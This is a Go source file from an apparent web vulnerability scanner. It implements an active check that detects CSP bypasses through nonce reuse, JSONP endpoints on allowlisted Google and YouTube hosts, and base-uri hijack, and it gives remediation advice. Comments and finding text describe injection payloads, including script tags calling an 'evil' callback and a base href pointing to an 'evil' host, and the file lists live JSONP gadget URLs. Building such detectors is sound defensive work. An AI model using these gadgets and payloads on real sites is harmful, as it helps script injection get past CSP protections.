package checks

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strings"

	"github.com/londonmax12/hyperz/internal/httpclient"
	"github.com/londonmax12/hyperz/internal/page"
	"github.com/londonmax12/hyperz/internal/scope"
)

// CSPBypass actively probes the three CSP bypass paths the passive
// csp-weak check can only theorize about:
//
//  1. Nonce reuse: a nonce that does not rotate per response is a static
//     string an attacker can read off any normal response and replay in
//     an injected <script nonce="..."> on the same origin. The probe
//     re-fetches the page with cache-busting and compares the nonces
//     emitted in script-src / style-src across the two responses;
//     identical values are conclusive evidence the server is not
//     rotating per request.
//
//  2. JSONP on a whitelisted host: a script-src allowlist that contains
//     a CDN known to host JSONP endpoints (ajax.googleapis.com,
//     www.google.com, www.youtube.com, ...) transitively trusts those
//     endpoints. An attacker with HTML injection can pull a JSONP URL
//     via <script src="https://cdn/jsonp?callback=evil"></script> and
//     execute evil(...) under the target's origin without ever needing
//     'unsafe-inline'. The probe walks the script-src allowlist, matches
//     each source against a curated table of known-JSONP CDNs, and sends
//     a canary-callback request to every match. A JavaScript content
//     type plus the canary echoed as a function invocation is conclusive.
//
//  3. Base-URI hijack precondition: when base-uri is missing or wildcard
//     AND the page actually loads scripts via relative URLs, an injected
//     <base href="//evil/"> retargets those relative loads. The probe
//     scans the live response body for relative <script src> tags; the
//     precondition that turns the passive csp-weak "base-uri missing"
//     nudge into a demonstrated bypass on this specific page.
//
// Each sub-probe is independent: a failure of one does not suppress the
// others. Findings are emitted per technique. The JSONP probe is the
// only one that issues traffic to hosts outside the user's scope - the
// destinations are public, well-documented JSONP endpoints (no auth,
// no state change) and contacting them is the only way to confirm the
// bypass without speculative pattern matching.
//
// Active (LevelDefault) check.
type CSPBypass struct{}

func (CSPBypass) Name() string { return "csp-bypass" }

func (CSPBypass) Level() Level { return LevelDefault }

const (
	// cspBypassBodyCap bounds bodies the check buffers - the relative
	// <script src> tags the base-uri probe inspects, and the JSONP echo
	// the whitelist probe matches. Both signals land in the first
	// kilobytes of any reasonable response; 64 KiB is generous headroom.
	cspBypassBodyCap = 64 << 10
	// cspBypassCallbackCanary is the JSONP callback name. Distinctive
	// enough that no live response will incidentally contain it; the
	// bypass is confirmed only when the endpoint echoes it as a function
	// call (canary followed by an opening paren).
	cspBypassCallbackCanary = "hyperzCspBypassCb"
)

// cspNonceRegex extracts the value portion of a 'nonce-XYZ' source. The
// keyword prefix is case-insensitive per the spec; the value itself
// is preserved verbatim so subsequent equality checks match the bytes
// the server actually emitted.
var cspNonceRegex = regexp.MustCompile(`(?i)'nonce-([^']+)'`)

// cspScriptSrcRelativeRegex finds <script src="..."> tags whose URL is
// relative to the document base (no scheme, no protocol-relative "//").
// Anchored on the src attribute so style/link tags with similar shapes
// do not get mixed in - those are a separate bypass surface and we are
// not probing them here.
var cspScriptSrcRelativeRegex = regexp.MustCompile(`(?is)<script\b[^>]*\bsrc\s*=\s*["']([^"']+)["']`)

func (c CSPBypass) Run(ctx context.Context, client *httpclient.Client, sc *scope.Scope, p page.Page) ([]Finding, error) {
	u, err := url.Parse(p.URL)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return nil, nil
	}
	if !sc.Allows(u) {
		return nil, nil
	}

	snap, err := ensureResponse(ctx, client, p, cspBypassBodyCap)
	if err != nil {
		return nil, err
	}

	enforcing := snap.Headers.Values("Content-Security-Policy")
	if len(enforcing) == 0 {
		// No enforcing CSP - csp-weak / security-headers already speak
		// to the absence; nothing for the bypass probes to bite on.
		return nil, nil
	}
	dirs := parseCSP(enforcing[0])

	var (
		findings []Finding
		firstErr error
	)

	if f, err := c.probeNonceReuse(ctx, client, p.URL, dirs); err != nil {
		Report(ctx, fmt.Errorf("csp-bypass nonce-reuse: %w", err))
		if firstErr == nil {
			firstErr = err
		}
	} else if f != nil {
		findings = append(findings, *f)
	}

	jsonpHits, err := c.probeJSONPWhitelist(ctx, client, p.URL, dirs)
	if err != nil {
		Report(ctx, fmt.Errorf("csp-bypass jsonp: %w", err))
		if firstErr == nil {
			firstErr = err
		}
	}
	findings = append(findings, jsonpHits...)

	if f := c.probeBaseURIHijack(p.URL, snap, dirs); f != nil {
		findings = append(findings, *f)
	}

	if len(findings) == 0 && firstErr != nil {
		return nil, firstErr
	}
	return findings, nil
}

// probeNonceReuse re-fetches the URL with cache-busting and compares the
// nonces in script-src / style-src between the original CSP header and
// the freshly-fetched one. Any nonce that appears in both is a static
// value being reused across responses - a single shared nonce is enough
// for an attacker to read it off a normal response and replay it in an
// injected <script nonce="...">, so we fire on the first match rather
// than requiring every nonce to repeat.
//
// Returns nil with no error when the policy has no nonces (nothing to
// compare), when the re-fetch yields no CSP header (we cannot claim
// reuse without two samples), or when every nonce on the second response
// differs (rotation works).
func (c CSPBypass) probeNonceReuse(ctx context.Context, client *httpclient.Client, target string, dirs map[string][]string) (*Finding, error) {
	originalNonces := nonceValues(dirs)
	if len(originalNonces) == 0 {
		return nil, nil
	}
	if client == nil {
		return nil, nil
	}

	probeURL, err := appendQueryParam(target, "hyperz_nonce_probe", "1")
	if err != nil {
		return nil, err
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
	if err != nil {
		return nil, err
	}
	// Defense in depth against an intermediary CDN serving the byte-
	// identical previous response (which would falsely look like nonce
	// reuse when it is just a cache hit on a static page).
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")

	resp, err := client.Do(ctx, req)
	if err != nil {
		return nil, err
	}
	// Drain and close so the connection can be reused; the second-fetch
	// body is not needed - everything load-bearing for the bypass lives
	// in the CSP header.
	_, _, readErr := httpclient.ReadBodyCapped(resp, cspBypassBodyCap)
	resp.Body.Close()
	if readErr != nil {
		return nil, readErr
	}

	secondPolicies := resp.Header.Values("Content-Security-Policy")
	if len(secondPolicies) == 0 {
		return nil, nil
	}
	secondDirs := parseCSP(secondPolicies[0])
	secondNonces := nonceValues(secondDirs)
	if len(secondNonces) == 0 {
		return nil, nil
	}

	secondSet := make(map[string]struct{}, len(secondNonces))
	for _, n := range secondNonces {
		secondSet[n] = struct{}{}
	}
	var reused []string
	seen := map[string]struct{}{}
	for _, n := range originalNonces {
		if _, ok := secondSet[n]; !ok {
			continue
		}
		if _, dup := seen[n]; dup {
			continue
		}
		seen[n] = struct{}{}
		reused = append(reused, n)
	}
	if len(reused) == 0 {
		return nil, nil
	}
	sort.Strings(reused)

	detail := fmt.Sprintf(
		"Two consecutive responses from %s carry the same CSP nonce(s) in script-src/style-src: %s. CSP nonces must be unpredictable and unique per response - a reused nonce is a static string the attacker can lift from any normal response and embed in an injected <script nonce=\"...\">, defeating the policy until the value finally rotates. The bypass works against the same XSS chain CSP exists to stop.",
		target, strings.Join(quoteStrings(reused), ", "))

	return &Finding{
		Check:       c.Name(),
		Target:      target,
		URL:         target,
		Severity:    SeverityHigh,
		Title:       "CSP nonce reused across responses",
		Detail:      detail,
		CWE:         "CWE-1004, CWE-330",
		OWASP:       "A05:2021 Security Misconfiguration",
		Remediation: "Generate a fresh, cryptographically random nonce per response (e.g. 16 bytes from a CSPRNG, base64url-encoded) and inject the same value into both the CSP header and every legitimate <script> / <style> tag in the body. Never derive the nonce from a static seed, a session ID, or a deployment-time constant.",
		Evidence:    BuildEvidence("GET", probeURL, resp.StatusCode, resp.Header, fmt.Sprintf("reused nonces: %s", strings.Join(reused, ", "))),
		DedupeKey:   MakeKey(c.Name(), ScopeHost, target, "nonce-reuse"),
	}, nil
}

// jsonpProbe pairs a CDN host with a JSONP endpoint URL fragment ending
// in "callback=" - the probe appends the canary callback name and inspects
// the response. Curated to endpoints documented as JSONP-bypass vectors
// in published CSP research and csp-evaluator's host_source_bypasses
// list. New entries should be (a) publicly accessible without auth,
// (b) state-free (idempotent GET), and (c) confirmable by callback echo.
type jsonpProbe struct {
	host    string
	urlTmpl string
}

var jsonpProbes = []jsonpProbe{
	{
		host:    "ajax.googleapis.com",
		urlTmpl: "https://ajax.googleapis.com/ajax/services/feed/find?v=1.0&q=hyperz&callback=",
	},
	{
		host:    "www.google.com",
		urlTmpl: "https://www.google.com/complete/search?client=chrome&q=hyperz&callback=",
	},
	{
		host:    "www.youtube.com",
		urlTmpl: "https://www.youtube.com/oembed?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DjNQXAC9IVRw&format=json&callback=",
	},
	{
		host:    "accounts.google.com",
		urlTmpl: "https://accounts.google.com/o/oauth2/revoke?callback=",
	},
}

// probeJSONPWhitelist walks the effective script-src allowlist, picks
// out sources that would allow loading a script from a known-JSONP CDN,
// and verifies the bypass by fetching the JSONP endpoint with a canary
// callback. Confirmation requires the response to (a) advertise a
// JavaScript content type and (b) contain the canary as a function
// invocation, so a CDN that returns JSON or an HTML error page is not
// mistaken for a working bypass.
//
// A network failure against one CDN does not suppress findings against
// the others - probes are independent and each writes its own Finding
// when confirmed.
func (c CSPBypass) probeJSONPWhitelist(ctx context.Context, client *httpclient.Client, target string, dirs map[string][]string) ([]Finding, error) {
	if client == nil {
		return nil, nil
	}
	scriptSrcs, _, present := resolveFetchDirective(dirs, "script-src")
	if !present {
		return nil, nil
	}

	var (
		findings []Finding
		firstErr error
	)
	for _, probe := range jsonpProbes {
		if ctx.Err() != nil {
			break
		}
		matched, ok := cspScriptSrcAllowsHost(scriptSrcs, probe.host)
		if !ok {
			continue
		}

		probeURL := probe.urlTmpl + cspBypassCallbackCanary
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
		if err != nil {
			if firstErr == nil {
				firstErr = err
			}
			continue
		}
		resp, err := client.Do(ctx, req)
		if err != nil {
			if firstErr == nil {
				firstErr = err
			}
			continue
		}
		body, truncated, readErr := httpclient.ReadBodyCapped(resp, cspBypassBodyCap)
		resp.Body.Close()
		if readErr != nil {
			if firstErr == nil {
				firstErr = readErr
			}
			continue
		}
		if !confirmsJSONP(resp.Header.Get("Content-Type"), body, cspBypassCallbackCanary) {
			continue
		}

		findings = append(findings, Finding{
			Check:    c.Name(),
			Target:   target,
			URL:      target,
			Severity: SeverityHigh,
			Title:    fmt.Sprintf("CSP script-src allowlists %s, which serves a JSONP bypass endpoint", probe.host),
			Detail: fmt.Sprintf(
				"The Content-Security-Policy on %s includes a source that allows scripts from %s (matched: %q). That host serves a JSONP endpoint at %s which echoes the supplied callback parameter into executable JavaScript. An attacker with HTML injection on %s can load <script src=\"%sEVIL\"></script> where EVIL is an attacker-controlled function name; the script then executes EVIL(...) under this origin and the CSP allows it because the host is on the script-src allowlist. The probe confirmed the bypass by fetching the endpoint with callback=%s and observing a JavaScript response containing the callback as a function call.",
				target, probe.host, matched, probe.urlTmpl, target, probe.urlTmpl, cspBypassCallbackCanary),
			CWE:         "CWE-829, CWE-79",
			OWASP:       "A05:2021 Security Misconfiguration",
			Remediation: fmt.Sprintf("Drop %s from script-src, or - if it is genuinely required - restrict it to a specific path prefix that excludes the JSONP endpoint (browsers honour path-bounded sources). Better: switch to a strict, nonce-based policy where third-party CDN hosts are not required at all. JSONP-on-allowlisted-CDN is one of the most heavily documented CSP bypass patterns; any CDN in a script-src deserves the same audit.", probe.host),
			Evidence:    BuildEvidence("GET", probeURL, resp.StatusCode, resp.Header, jsonpEvidenceSnippet(body, truncated)),
			DedupeKey:   MakeKey(c.Name(), ScopeHost, target, "jsonp:"+probe.host),
		})
	}
	if len(findings) == 0 && firstErr != nil {
		return nil, firstErr
	}
	return findings, nil
}

// probeBaseURIHijack fires when the CSP either omits base-uri or sets
// it permissively AND the page actually depends on relative <script src>
// loads. Both halves are required for the bypass to be exploitable: a
// missing base-uri without any relative-src consumer is just a passive
// nudge (already covered by csp-weak), and relative srcs with a tight
// base-uri 'none' are inert. The active confirmation is that the page
// in front of us has the load pattern that an injected <base> tag would
// actually retarget.
func (c CSPBypass) probeBaseURIHijack(target string, snap snapshot, dirs map[string][]string) *Finding {
	if !baseURIIsHijackable(dirs) {
		return nil
	}
	if len(snap.Body) == 0 {
		return nil
	}
	matches := cspScriptSrcRelativeRegex.FindAllSubmatch(snap.Body, -1)
	if len(matches) == 0 {
		return nil
	}
	seen := map[string]struct{}{}
	var relatives []string
	for _, m := range matches {
		src := strings.TrimSpace(string(m[1]))
		if src == "" {
			continue
		}
		if isAbsoluteOrProtocolRelative(src) {
			continue
		}
		if _, ok := seen[src]; ok {
			continue
		}
		seen[src] = struct{}{}
		relatives = append(relatives, src)
	}
	if len(relatives) == 0 {
		return nil
	}
	sort.Strings(relatives)

	preview := relatives
	if len(preview) > 5 {
		preview = preview[:5]
	}

	detail := fmt.Sprintf(
		"Response from %s does not constrain base-uri (or constrains it permissively) AND loads %d script(s) via relative URLs. An attacker with HTML injection can place <base href=\"//evil/\"> in the document; every relative script src below then resolves to evil/ on the next load. base-uri does NOT inherit from default-src, so a tight default-src is not enough on its own. Relative srcs observed (first %d shown): %s.",
		target, len(relatives), len(preview), strings.Join(quoteStrings(preview), ", "))

	return &Finding{
		Check:       c.Name(),
		Target:      target,
		URL:         target,
		Severity:    SeverityMedium,
		Title:       "Base-URI hijack is exploitable on this page",
		Detail:      detail,
		CWE:         "CWE-1021, CWE-79",
		OWASP:       "A05:2021 Security Misconfiguration",
		Remediation: "Add base-uri 'none' (or 'self') to the CSP. Once base-uri is constrained, an injected <base> tag cannot retarget relative URLs and the rest of the policy regains its grip on script loading.",
		Evidence:    BuildEvidence("GET", target, snap.Status, snap.Headers, fmt.Sprintf("relative script srcs: %s", strings.Join(relatives, ", "))),
		DedupeKey:   MakeKey(c.Name(), ScopePage, target, "base-uri-hijack"),
	}
}

// nonceValues returns the unique nonce VALUES (the bit after "nonce-")
// appearing in script-src and style-src. Both directives are inspected
// because reuse in either is a fatal policy defect, and a site that
// rotates one but not the other still has the inline-style-injection
// half of the bypass available.
func nonceValues(dirs map[string][]string) []string {
	var out []string
	seen := map[string]struct{}{}
	for _, name := range []string{"script-src", "style-src"} {
		for _, src := range dirs[name] {
			m := cspNonceRegex.FindStringSubmatch(src)
			if len(m) < 2 {
				continue
			}
			v := m[1]
			if _, ok := seen[v]; ok {
				continue
			}
			seen[v] = struct{}{}
			out = append(out, v)
		}
	}
	return out
}

// baseURIIsHijackable returns true when the CSP either omits base-uri
// entirely or includes a wildcard / scheme-only token that still lets
// an attacker point <base href> at an arbitrary host. base-uri does
// NOT inherit from default-src, so absence alone is enough.
func baseURIIsHijackable(dirs map[string][]string) bool {
	v, present := dirs["base-uri"]
	if !present {
		return true
	}
	for _, s := range v {
		ls := strings.ToLower(strings.TrimSpace(s))
		if ls == "*" || ls == "https:" || ls == "http:" || ls == "data:" {
			return true
		}
	}
	return false
}

// cspScriptSrcAllowsHost reports whether any source in sources would
// allow loading a script from candidateHost over HTTPS. Implements the
// subset of CSP source matching the JSONP probe needs:
//
//   - bare "*" trusts everything
//   - "https:" / "http:" (scheme-only) trusts every host on that scheme
//   - "*.domain.tld" matches any subdomain of domain.tld (and the apex,
//     per the CSP spec)
//   - "host[:port]" / "scheme://host[:port][/path]" must match host exactly
//
// Returns the original source string that matched so the finding can
// quote the exact CSP token responsible. Quoted keywords ('self',
// nonces, hashes) are skipped - they do not allow third-party hosts.
func cspScriptSrcAllowsHost(sources []string, candidateHost string) (string, bool) {
	cand := strings.ToLower(candidateHost)
	for _, raw := range sources {
		s := strings.ToLower(strings.TrimSpace(raw))
		if s == "" {
			continue
		}
		if strings.HasPrefix(s, "'") {
			continue
		}
		if s == "*" {
			return raw, true
		}
		if s == "https:" || s == "http:" {
			return raw, true
		}
		host := hostOfCSPSource(s)
		if host == "" {
			continue
		}
		if strings.HasPrefix(host, "*.") {
			// "*.example.com" matches any subdomain, and per the CSP
			// spec also the apex "example.com".
			suffix := host[1:] // ".example.com"
			apex := host[2:]   // "example.com"
			if strings.HasSuffix(cand, suffix) || cand == apex {
				return raw, true
			}
			continue
		}
		if host == cand {
			return raw, true
		}
	}
	return "", false
}

// hostOfCSPSource pulls the host portion of a CSP source value. Accepts
// "host", "host:port", "scheme://host", "scheme://host:port",
// "host/path", etc. The port is stripped (probes target the default 443).
// Returns empty when the value cannot be coerced into a host (e.g. a
// scheme-only token, which is handled earlier as a special case).
func hostOfCSPSource(s string) string {
	s = strings.ToLower(strings.TrimSpace(s))
	if i := strings.Index(s, "://"); i != -1 {
		s = s[i+3:]
	}
	if i := strings.Index(s, "/"); i != -1 {
		s = s[:i]
	}
	if i := strings.LastIndex(s, ":"); i != -1 {
		port := s[i+1:]
		if port == "*" || isAllDigits(port) {
			s = s[:i]
		}
	}
	return s
}

func isAllDigits(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if r < '0' || r > '9' {
			return false
		}
	}
	return true
}

// confirmsJSONP returns true when ct is a JavaScript content type AND
// body contains the canary callback name immediately followed by an
// opening paren. The function-call shape is what makes the response
// JSONP - a JSON error body that merely mentions the callback name as
// a string would otherwise false-positive (e.g. {"error":"bad callback
// hyperzCspBypassCb"}), and we want only confirmed bypasses.
func confirmsJSONP(ct string, body []byte, canary string) bool {
	c := strings.ToLower(strings.TrimSpace(ct))
	jsCT := strings.HasPrefix(c, "application/javascript") ||
		strings.HasPrefix(c, "text/javascript") ||
		strings.HasPrefix(c, "application/x-javascript")
	if !jsCT {
		return false
	}
	return bytes.Contains(body, []byte(canary+"("))
}

func jsonpEvidenceSnippet(body []byte, truncated bool) string {
	const max = 200
	s := string(body)
	if len(s) > max {
		s = s[:max] + "..."
	}
	if truncated {
		s += " [body cap reached]"
	}
	return s
}

// isAbsoluteOrProtocolRelative reports whether src has a scheme or is
// "//host/..." - the cases base-uri hijack does NOT affect because the
// target origin is fully specified by the URL itself.
func isAbsoluteOrProtocolRelative(src string) bool {
	if strings.HasPrefix(src, "//") {
		return true
	}
	if i := strings.Index(src, ":"); i > 0 {
		head := src[:i]
		for _, r := range head {
			if !(r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9' || r == '+' || r == '-' || r == '.') {
				return false
			}
		}
		return true
	}
	return false
}

// appendQueryParam returns rawurl with key=val added to its query
// string. Used by the nonce-reuse probe to bust intermediary caches on
// the second fetch.
func appendQueryParam(rawurl, key, val string) (string, error) {
	u, err := url.Parse(rawurl)
	if err != nil {
		return "", err
	}
	q := u.Query()
	q.Set(key, val)
	u.RawQuery = q.Encode()
	return u.String(), nil
}

// quoteStrings returns ss with each element wrapped in Go-style double
// quotes for inclusion in detail text. Strings.Join'ing the result
// produces a comma-separated list a human can read without ambiguity
// about whitespace or special characters in each value.
func quoteStrings(ss []string) []string {
	out := make([]string, len(ss))
	for i, s := range ss {
		out[i] = fmt.Sprintf("%q", s)
	}
	return out
}
